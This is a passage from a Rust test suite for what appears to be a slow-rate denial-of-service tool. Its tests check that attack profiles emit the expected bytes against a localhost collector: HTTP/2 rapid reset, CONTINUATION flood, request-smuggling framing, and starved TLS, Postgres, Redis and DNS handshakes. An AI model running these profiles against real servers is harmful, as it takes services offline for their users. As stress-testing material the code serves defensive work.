                    Ok(n) => buf.extend_from_slice(&tmp[..n]),
                    Err(_) => break,
                }
            }
            buf
        });

        let cfg = config("ftp-slow-command");
        let mut rng = Rng::new(9);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(20));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // Verify FTP commands were sent
        assert!(text.contains("USER"), "USER command missing");
        assert!(text.contains("PASS"), "PASS command missing");
        assert!(text.contains("PASV"), "PASV command missing");
    }

    #[test]
    fn multipart_slow_upload_sends_multipart_preamble() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).ok();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            // Accept loop mirrors engine_opens_and_holds_connections: a raw
            // accepted socket keeps reading until the client goes away or
            // the deadline passes, so no observed write can be lost.
            let mut sock_opt: Option<TcpStream> = None;
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while sock_opt.is_none() && std::time::Instant::now() < deadline {
                match listener.accept() {
                    Ok((sock, _)) => sock_opt = Some(sock),
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
            let mut sock = match sock_opt {
                Some(sock) => sock,
                None => return Vec::new(),
            };
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(0) => break, // client went away
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 2048 {
                            break;
                        }
                    }
                    Err(ref err)
                        if err.kind() == io::ErrorKind::WouldBlock
                            || err.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let mut cfg = config("multipart-slow-upload");
        // A fat byte budget keeps the profile in its endless dribble phase
        // (never blocked on `Content-Length` accounting) while the killer
        // thread's 400ms window caps how many dribble bytes arrive.
        cfg.base_post_length = 65536;
        // Zero dribble delay: the ~10 line-by-line header writes must all
        // land inside the window the killer thread leaves open. Generous
        // socket timeouts defeat the OS-level write stall entirely.
        cfg.delay_min = 0.0;
        cfg.delay_max = 0.0;
        cfg.connect_timeout = 5.0;
        let mut rng = Rng::new(10);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(400));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // The killer lets the dribble loop run long after the headers are
        // out, so drained assertions must only cover the header section:
        // bound the checks to the completed request head. (The collector
        // cap of 2048 bytes keeps a bounded tail of dribble bytes around.)
        // Header names are case-insensitive on the wire (RFC 9110 §5.1), so
        // match the multipart marker case-insensitively: the only
        // guaranteed-complete structure is the bytes up to the FIRST header
        // terminator, and the collector cap (~2 KB) means later bytes may be
        // truncated mid-dribble, so slice there before asserting.
        let head_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        let head = text[..head_end].to_ascii_lowercase();
        assert!(
            head.starts_with("post / http/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        assert!(
            head.contains("content-type: multipart/form-data; boundary="),
            "multipart content type missing"
        );
        // The upload preamble follows the header terminator; require it, then
        // prove the run never emitted a closing boundary for the boundary it
        // actually advertised. The closing delimiter is the MIME framing
        // (`--` + token + `--`); compare against the lowercased capture so
        // the (legal) header-name casing can never hide a real terminator.
        let after_head = text[head_end..].to_ascii_lowercase();
        assert!(
            after_head.contains("content-disposition: form-data; name=\"upload\""),
            "upload part preamble missing"
        );
        let boundary = head
            .split("boundary=")
            .nth(1)
            .expect("boundary")
            .split("\r\n")
            .next()
            .unwrap_or("");
        assert!(
            boundary.len() > "----webkitformboundary".len(),
            "boundary token missing"
        );
        let closer = format!("--{boundary}--");
        assert!(
            !text.to_ascii_lowercase().contains(&closer),
            "closing boundary must never be emitted"
        );
    }

    #[test]
    fn expect_continue_abuse_announces_body_and_stalls() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).ok();
        let addr = listener.local_addr().unwrap();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let stop2 = stop.clone();
        let collector = std::thread::spawn(move || {
            // Accept loop mirrors engine_opens_and_holds_connections, then
            // keep READING (never reply, never close early): the collector
            // plays a patient server that holds the socket open while the
            // client stalls its announced body.
            let mut sock_opt: Option<TcpStream> = None;
            let accept_deadline = std::time::Instant::now() + Duration::from_secs(8);
            while sock_opt.is_none() && std::time::Instant::now() < accept_deadline {
                match listener.accept() {
                    Ok((sock, _)) => sock_opt = Some(sock),
                    Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
            let mut sock = match sock_opt {
                Some(sock) => sock,
                None => return Vec::new(),
            };
            let _ = sock.set_read_timeout(Some(Duration::from_millis(600)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_secs(8);
            while std::time::Instant::now() < deadline && !stop2.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(0) => break, // client went away
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= 1400 {
                            break;
                        }
                    }
                    Err(ref err)
                        if err.kind() == io::ErrorKind::WouldBlock
                            || err.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(_) => break,
                }
            }
            buf
        });

        let mut cfg = config("expect-continue-abuse");
        cfg.base_post_length = 65536;
        // A zero delay plus a fat byte budget keeps the stall dribbling for
        // the whole killer window; the interim read deadline is exercised by
        // the silent collector above.
        cfg.delay_min = 0.0;
        cfg.delay_max = 0.0;
        cfg.connect_timeout = 5.0;
        let mut rng = Rng::new(11);
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(400));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
        let _completed = run_profile(&cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        stop.store(true, Ordering::Relaxed);
        let _ = killer_thread.join();

        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        // The killer lets the run dribble for its whole 400ms window, and
        // the interim read on a silent server blocks for the full
        // connect_timeout. Assert against what the profile provably did —
        // announce the body and stall it — rather than a byte count that
        // depends on how the two racing clocks interleave.
        assert!(
            text.starts_with("POST / HTTP/1.1\r\n"),
            "missing or malformed request line: {text}"
        );
        assert!(
            text.contains("Expect: 100-continue"),
            "Expect header missing"
        );
        assert!(
            text.contains("Content-Length:"),
            "announced body length missing"
        );
        let header_end = text.find("\r\n\r\n").expect("header terminator") + 4;
        assert!(
            stats.bytes_sent() as usize >= header_end,
            "client must have written at least the announced headers"
        );
    }

    // --- Phase 1 Tier-1 protocol-starvation modes --------------------------

    fn contains(hay: &[u8], needle: &[u8]) -> bool {
        !needle.is_empty() && hay.windows(needle.len()).any(|w| w == needle)
    }

    /// Accept one connection and collect up to `cap` bytes, never replying.
    fn spawn_collector(
        listener: TcpListener,
        stop: std::sync::Arc<AtomicBool>,
        cap: usize,
    ) -> std::thread::JoinHandle<Vec<u8>> {
        std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = sock.set_read_timeout(Some(Duration::from_millis(100)));
            let mut buf = Vec::new();
            let mut tmp = [0u8; 1024];
            let deadline = std::time::Instant::now() + Duration::from_millis(1500);
            while std::time::Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
                match sock.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => {
                        buf.extend_from_slice(&tmp[..n]);
                        if buf.len() >= cap {
                            break;
                        }
                    }
                    Err(ref e)
                        if e.kind() == io::ErrorKind::WouldBlock
                            || e.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(_) => break,
                }
            }
            buf
        })
    }

    /// Connect, run the mode's handler under a killer that stops it after
    /// `ms`, and return the stats gathered while it held the connection.
    fn run_handler(cfg: &EngineConfig, addr: std::net::SocketAddr, seed: u64, ms: u64) -> Stats {
        let stats = Stats::new();
        let running = std::sync::Arc::new(AtomicBool::new(true));
        let killer = running.clone();
        let killer_thread = std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(ms));
            killer.store(false, Ordering::Relaxed);
        });
        let mut stream = TcpStream::connect(addr).unwrap();
        let _ = stream.set_write_timeout(Some(Duration::from_secs(5)));
        let mut rng = Rng::new(seed);
        let _ = run_profile(cfg, &mut stream, &stats, &running, &mut rng);
        stream.shutdown(std::net::Shutdown::Both).ok();
        let _ = killer_thread.join();
        stats
    }

    fn collector_and_addr() -> (std::net::SocketAddr, TcpListener) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        (addr, listener)
    }

    #[test]
    fn imap_slow_literal_announces_unclosed_literal() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let mut cfg = config("imap-slow-literal");
        cfg.base_post_length = 64;
        let stats = run_handler(&cfg, addr, 21, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(stats.bytes_sent() > 0);
        assert!(
            contains(&received, b" APPEND INBOX {"),
            "literal command missing"
        );
        assert!(contains(&received, b"}\r\n"), "literal marker not closed");
    }

    #[test]
    fn redis_resp_slow_declares_oversized_bulk() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let mut cfg = config("redis-resp-slow");
        cfg.base_post_length = 64;
        run_handler(&cfg, addr, 22, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let marker = b"*1\r\n$";
        let pos = received
            .windows(marker.len())
            .position(|w| w == marker)
            .expect("RESP multibulk/bulk framing missing");
        let start = pos + marker.len();
        let mut end = start;
        while end < received.len() && received[end].is_ascii_digit() {
            end += 1;
        }
        let declared: usize = std::str::from_utf8(&received[start..end])
            .unwrap()
            .parse()
            .unwrap();
        assert!(declared >= 64, "bulk length too small: {declared}");
    }

    #[test]
    fn postgres_startup_slow_claims_large_packet() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let mut cfg = config("postgres-startup-slow");
        cfg.base_post_length = 64;
        run_handler(&cfg, addr, 23, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.len() >= 8, "startup header truncated");
        let total = u32::from_be_bytes([received[0], received[1], received[2], received[3]]);
        let version = u32::from_be_bytes([received[4], received[5], received[6], received[7]]);
        assert_eq!(version, 196608, "protocol version must be 3.0");
        assert_eq!(total, 8 + 64, "declared startup packet length wrong");
        assert!(
            contains(&received, b"user=slowprobe\0"),
            "startup parameters missing"
        );
    }

    #[test]
    fn dns_tcp_slow_announces_oversized_query() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let mut cfg = config("dns-tcp-slow");
        cfg.base_post_length = 64;
        run_handler(&cfg, addr, 24, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.len() >= 4, "tcp-length prefix + header truncated");
        let declared = u16::from_be_bytes([received[0], received[1]]);
        assert_eq!(declared, 64, "declared query size wrong");
        assert_eq!(&received[2..4], &[0xAA, 0xBB], "query ID not at offset");
    }

    #[test]
    fn nntp_slow_post_never_terminates_article() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let cfg = config("nntp-slow-post");
        run_handler(&cfg, addr, 25, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.starts_with(b"POST\r\n"), "POST command not first");
        assert!(
            !contains(&received, b"\r\n.\r\n"),
            "article terminator leaked"
        );
    }

    #[test]
    fn idle_hold_sends_nothing() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 512);
        let cfg = config("idle-hold");
        let stats = run_handler(&cfg, addr, 26, 200);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert_eq!(stats.bytes_sent(), 0, "idle-hold must send no bytes");
        assert!(received.is_empty(), "server received unexpected bytes");
    }

    // --- Phase 2 Tier-2 HTTP-parser-targeted modes -------------------------

    #[test]
    fn slow_xml_announces_unclosed_document() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 2048);
        let mut cfg = config("slow-xml");
        cfg.base_post_length = 64;
        run_handler(&cfg, addr, 31, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.contains("Content-Type: application/xml"));
        assert!(text.contains("Content-Length:"));
        assert!(
            text.contains("<?xml") && text.contains("<!DOCTYPE"),
            "XML prelude missing"
        );
    }

    #[test]
    fn slow_form_parse_streams_urlencoded_pairs() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 2048);
        let mut cfg = config("slow-form-parse");
        cfg.base_post_length = 64;
        run_handler(&cfg, addr, 32, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.contains("Content-Type: application/x-www-form-urlencoded"));
        let he = text.find("\r\n\r\n").expect("headers must complete") + 4;
        let body = &text[he..];
        assert!(
            body.contains('=') && body.contains('&'),
            "no urlencoded pairs"
        );
    }

    #[test]
    fn header_count_flood_completes_many_headers() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 70_000);
        let cfg = config("header-count-flood");
        run_handler(&cfg, addr, 33, 800);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        let count = text.matches("\r\nX-").count();
        assert!(count >= 200, "expected a flood of headers, got {count}");
        assert!(
            contains(&received, b"\r\n\r\n"),
            "header block must complete"
        );
    }

    #[test]
    fn websocket_slow_frame_completes_handshake_then_dribbles() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 2048);
        let cfg = config("websocket-slow-frame");
        run_handler(&cfg, addr, 34, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received);
        assert!(text.contains("Upgrade: websocket"));
        let he = text
            .find("\r\n\r\n")
            .expect("upgrade request must complete")
            + 4;
        let frame = &received[he..];
        assert!(frame.len() >= 2, "a WebSocket frame header must follow");
        assert_eq!(frame[0], 0x81, "expected FIN|text frame opcode");
    }

    #[test]
    fn req_smuggling_probe_sends_ambiguous_framing() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 2048);
        let cfg = config("req-smuggling-probe");
        run_handler(&cfg, addr, 35, 200);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        let text = String::from_utf8_lossy(&received).to_ascii_lowercase();
        assert!(text.contains("content-length:"), "CL framing missing");
        assert!(
            text.contains("transfer-encoding: chunked"),
            "TE framing missing"
        );
    }

    // --- Phase 3 Tier-3 HTTP/2 framing/HPACK-abuse modes -------------------

    /// Parse HTTP/2 frames starting at `offset` (past the 24-octet preface),
    /// yielding `(stream_id, type, flags, payload)` for each *complete* frame.
    /// Stops as soon as the buffer lacks a full header + payload, so a
    /// truncated capture still yields every whole frame received so far.
    fn h2_frames(data: &[u8], offset: usize) -> Vec<(u32, u8, u8, Vec<u8>)> {
        let mut out = Vec::new();
        let mut i = offset;
        while i + 9 <= data.len() {
            let len =
                ((data[i] as usize) << 16) | ((data[i + 1] as usize) << 8) | data[i + 2] as usize;
            let ftype = data[i + 3];
            let flags = data[i + 4];
            let sid = u32::from_be_bytes(data[i + 5..i + 9].try_into().unwrap()) & 0x7FFF_FFFF;
            let end = i + 9 + len;
            if end > data.len() {
                break;
            }
            out.push((sid, ftype, flags, data[i + 9..end].to_vec()));
            i = end;
        }
        out
    }

    #[test]
    fn h2_rapid_reset_opens_and_resets_streams() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 200_000);
        let cfg = config("h2-rapid-reset");
        run_handler(&cfg, addr, 41, 400);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(
            received.starts_with(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"),
            "connection preface missing"
        );
        let frames = h2_frames(&received, 24);
        assert!(!frames.is_empty(), "no complete frames captured");
        assert_eq!(frames[0].1, h2::SETTINGS, "first frame must be SETTINGS");
        assert!(
            frames.iter().any(|(_, t, _, _)| *t == h2::RST_STREAM),
            "no RST_STREAM frames emitted"
        );
        assert!(
            frames.iter().any(|(_, t, f, _)| {
                *t == h2::HEADERS && (f & h2::END_HEADERS) != 0 && (f & h2::END_STREAM) != 0
            }),
            "no complete self-contained HEADERS frame"
        );
    }

    #[test]
    fn h2_slow_streams_leaves_streams_half_open() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 8192);
        let cfg = config("h2-slow-streams");
        run_handler(&cfg, addr, 42, 400);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.starts_with(h2::PREFACE), "preface missing");
        let frames = h2_frames(&received, 24);
        let headers = frames
            .iter()
            .filter(|(_, t, _, _)| *t == h2::HEADERS)
            .count();
        assert!(headers >= 32, "expected 32 opened streams, got {headers}");
        for (_, ftype, flags, _) in &frames {
            if *ftype == h2::HEADERS {
                assert_eq!(
                    flags & h2::END_STREAM,
                    0,
                    "HEADERS must not set END_STREAM (stream stays half-open)"
                );
            }
        }
        assert!(
            frames.iter().any(|(_, t, _, _)| *t == h2::DATA),
            "no dribbled DATA frames"
        );
    }

    #[test]
    fn h2_continuation_flood_never_ends_headers() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 200_000);
        let cfg = config("h2-continuation-flood");
        run_handler(&cfg, addr, 43, 800);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.starts_with(h2::PREFACE), "preface missing");
        let frames = h2_frames(&received, 24);
        let cont = frames
            .iter()
            .filter(|(_, t, _, _)| *t == h2::CONTINUATION)
            .count();
        assert!(cont >= 100, "expected a flood of CONTINUATION, got {cont}");
        for (_, ftype, flags, _) in &frames {
            if *ftype == h2::CONTINUATION || *ftype == h2::HEADERS {
                assert_eq!(
                    flags & h2::END_HEADERS,
                    0,
                    "header block must never be closed (END_HEADERS clear)"
                );
            }
        }
    }

    #[test]
    fn h2_hpack_drip_fragments_one_header_block() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 4096);
        let cfg = config("h2-hpack-drip");
        run_handler(&cfg, addr, 44, 400);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(received.starts_with(h2::PREFACE), "preface missing");
        let frames = h2_frames(&received, 24);
        let mut block: Vec<u8> = Vec::new();
        for (sid, ftype, _, payload) in &frames {
            if *sid == 1 && (*ftype == h2::HEADERS || *ftype == h2::CONTINUATION) {
                block.extend_from_slice(payload);
            }
        }
        assert!(
            block.starts_with(b"\x00\x07:method"),
            "reassembled HPACK block must open with a literal :method field"
        );
        assert!(
            frames
                .iter()
                .any(|(_, t, f, _)| *t == h2::CONTINUATION && (f & h2::END_HEADERS) != 0),
            "final CONTINUATION must set END_HEADERS"
        );
    }

    // --- Phase 4 Tier-4 TLS-handshake starvation modes ---------------------

    #[test]
    fn tls_slow_hello_announces_starved_handshake_record() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 4096);
        let cfg = config("tls-slow-hello");
        let stats = run_handler(&cfg, addr, 51, 300);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(stats.bytes_sent() > 0);
        // A handshake record header (0x16, TLS 1.0 record version) declaring the
        // full max-record length, with a ClientHello inside that promises the
        // same - far more than the bytes actually sent.
        assert!(received.len() >= 9, "truncated capture: {received:?}");
        assert_eq!(received[0], 0x16, "expected handshake content type");
        assert_eq!(
            u16::from_be_bytes([received[1], received[2]]),
            0x0301,
            "expected SSL31/TLS12 record version"
        );
        let declared = u16::from_be_bytes([received[3], received[4]]) as usize;
        assert_eq!(declared, 1 << 14, "record must over-promise the max length");
        assert_eq!(received[5], 0x01, "expected ClientHello handshake type");
        let msg_len =
            ((received[6] as usize) << 16) | ((received[7] as usize) << 8) | received[8] as usize;
        assert_eq!(
            msg_len,
            declared - 4,
            "handshake length must track the record"
        );
        // Starved: we deliver vastly fewer bytes than the record declares.
        assert!(received.len() < declared, "record must be under-delivered");
    }

    #[test]
    fn tls_renego_hold_emits_repeated_starved_clienthellos() {
        let (addr, listener) = collector_and_addr();
        let stop = std::sync::Arc::new(AtomicBool::new(false));
        let collector = spawn_collector(listener, stop.clone(), 4096);
        let cfg = config("tls-renego-hold");
        let stats = run_handler(&cfg, addr, 52, 400);
        stop.store(true, Ordering::Relaxed);
        let received = collector.join().unwrap();
        assert!(stats.bytes_sent() > 0);
        assert!(!received.is_empty(), "no TLS bytes captured");
        assert_eq!(received[0], 0x16, "expected handshake content type");
        let declared = u16::from_be_bytes([received[3], received[4]]) as usize;
        assert_eq!(
            declared, 2048,
            "renegotiation record declares a smaller record"
        );
        assert_eq!(received[5], 0x01, "expected ClientHello handshake type");
        // Multiple fresh (re)handshake initiations on one connection: count the
        // handshake-record headers (0x16 0x03 0x01) seen in the stream.
        let records = received
            .windows(3)
            .filter(|w| w.starts_with(&[0x16u8, 0x03, 0x01]))
            .count();
        assert!(
            records >= 2,
            "expected repeated ClientHello records, got {records}"
        );
    }
}
